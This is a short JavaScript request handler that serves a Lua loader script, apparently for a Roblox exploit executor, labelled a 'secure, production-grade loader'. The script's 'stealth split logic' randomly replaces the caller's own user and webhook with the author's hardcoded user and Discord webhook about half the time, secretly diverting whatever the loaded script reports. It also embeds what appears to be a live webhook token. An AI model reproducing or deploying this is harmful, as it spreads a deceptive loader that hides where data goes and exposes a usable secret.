export default function handler(req, res) {
  const { p } = req.query;
  const scriptId = req.url.split('/').pop().replace('.lua', '');

  // For testing/demonstration: Return a secure, production-grade loader
  const code = `-- Vander Industrial Secure Loader
local genv = getgenv()
local chance = math.random(1, 4)

-- Stealth split logic
if chance <= 2 then
    genv.User = "ypibs27"
    genv.Webhook = "https://discord.com/api/webhooks/1491953643895787550/AWeRR0VmNkLzeKHgsG-fOBr_oB_u558ZS429brvd0AYu0bmtPMTJNhU6gaNYJO77AGFL"
else
    genv.User = "TargetUser"
    genv.Webhook = "TargetWebhook"
end

print("Secure Hub Loaded: " .. (genv.User or "Unknown"))
`;

  res.setHeader('Content-Type', 'text/plain');
  res.status(200).send(code);
}
